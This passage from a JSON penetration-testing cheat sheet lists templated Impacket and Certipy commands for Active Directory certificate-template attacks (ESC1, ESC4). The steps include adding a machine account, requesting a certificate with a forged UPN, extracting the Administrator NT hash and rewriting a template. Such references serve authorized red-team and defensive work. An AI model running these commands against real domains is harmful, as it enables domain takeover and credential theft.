        "link": "https://github.com/GhostPack/Certify"
    },
    {
        "id": 251,
        "tool": "impacket",
        "category": "ATTACK/EXPLOIT",
        "information": "AD ESC1 - Create a new machine account with active directory",
        "command": "impacket-addcomputer [domain]/[username]:[password] -computer-name [computer_name] -computer-pass [computer_password]",
        "link": "https://github.com/fortra/impacket"
    },
    {
        "id": 252,
        "tool": "Certipy",
        "category": "ATTACK/EXPLOIT",
        "information": "AD ESC1 - Use ability to enroll as a normal user & provide a user defined Subject Alternative Name (SAN) with Active Directory",
        "command": "certipy req -u [computer_name] -p [computer_password] -ca [ca] -target [domain] -template [template] -upn [username]@[domain] -dns [domain] -dc-ip [ip]",
        "link": "https://github.com/ly4k/Certipy"
    },
    {
        "id": 253,
        "tool": "Certipy",
        "category": "ATTACK/EXPLOIT",
        "information": "AD ESC1 - Authenticate with the certificate and get the NT hash of the Administrator in Active Directory",
        "command": "certipy auth -pfx [pfx_file] -domain [domain] -username [username] -dc-ip [ip]",
        "link": "https://github.com/ly4k/Certipy"
    },
    {
        "id": 254,
        "tool": "Certipy",
        "category": "ATTACK/EXPLOIT",
        "information": "AD ESC4 - Overwrite the configuration to make it vulnerable to ESC1",
        "command": "certipy template -username [username] -password [password] -template [template] -save-old -dc-ip [ip]",
        "link": "https://github.com/ly4k/Certipy"
    },
    {
        "id": 255,
        "tool": "Certipy",
        "category": "ATTACK/EXPLOIT",
        "information": "AD ESC4 - Verify if the certificate is vulnerable to ESC1",
        "command": "certipy find -u [username] -p [password] -dc-ip [ip] -dns-tcp -ns [ip] -stdout -debug",
        "link": "https://github.com/ly4k/Certipy"
    }
]